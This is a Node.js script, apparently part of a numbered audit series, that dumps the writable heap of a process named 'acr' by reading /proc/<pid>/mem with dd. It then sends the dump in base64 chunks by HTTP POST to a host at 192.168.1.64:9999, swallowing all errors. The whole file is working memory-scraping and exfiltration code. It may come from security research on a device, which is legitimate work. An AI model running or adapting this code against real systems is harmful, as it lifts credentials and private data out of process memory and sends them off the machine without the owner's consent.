"use strict";
// audit127.js - transfer the acr heap dump (/tmp/acr_mem.bin) to the PC via chunked
// base64 HTTP POST to :9999 (proven channel). Fires all chunk POSTs synchronously
// (reliable in this VM) then a manifest. PC reassembles from capture files.
var http = require("http");
var cp = require("child_process");

var HOST = "192.168.1.64", PORT = 9999;
var FILE = "/tmp/acr_mem.bin";
var CHUNK = 1500000; // 1.5MB binary per chunk

function post(path, body) {
    try {
        var data = JSON.stringify(body);
        var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
            headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
            function (res) { try { res.resume(); } catch (e) {} });
        req.on("error", function () {});
        req.write(data); req.end();
    } catch (e) {}
}
function sh(cmd, cap, to) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: to || 60000 }).slice(0, cap || 6000000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

// 1. dump rw heap
var dump = sh("cat /proc/$(pidof acr | awk '{print $1}')/maps | awk '$2 ~ /^rw/ {split($1,a,\"-\"); print a[1], a[2]}' > /tmp/.amap; " +
    "> /tmp/acr_mem.bin; while read s e; do ss=$(printf '%d' 0x$s); es=$(printf '%d' 0x$e); sz=$((es-ss)); " +
    "dd if=/proc/$(pidof acr | awk '{print $1}')/mem bs=4096 skip=$((ss/4096)) count=$(((sz+4095)/4096)) 2>/dev/null | head -c $sz >> /tmp/acr_mem.bin; " +
    "done < /tmp/.amap; wc -c /tmp/acr_mem.bin", 200, 40000);

var totalSize = parseInt((dump.match(/(\d+)\s*\/tmp/) || [])[1] || "0", 10);
var totalChunks = Math.ceil(totalSize / CHUNK);
post("/p127_start", { size: totalSize, chunks: totalChunks, chunk: CHUNK, dump: dump.trim() });

// 2. fire all chunk POSTs synchronously (no setTimeout -> reliable in this VM)
for (var idx = 0; idx < totalChunks; idx++) {
    var b64 = sh("dd if=" + FILE + " bs=" + CHUNK + " skip=" + idx + " count=1 2>/dev/null | base64 -w 0", 3000000, 20000);
    post("/p127_c" + idx, { i: idx, n: totalChunks, d: (b64 || "").trim() });
}

post("/p127_done", { chunks: totalChunks, size: totalSize });
console.log("audit127 sent " + totalChunks + " chunks of " + totalSize + " bytes");
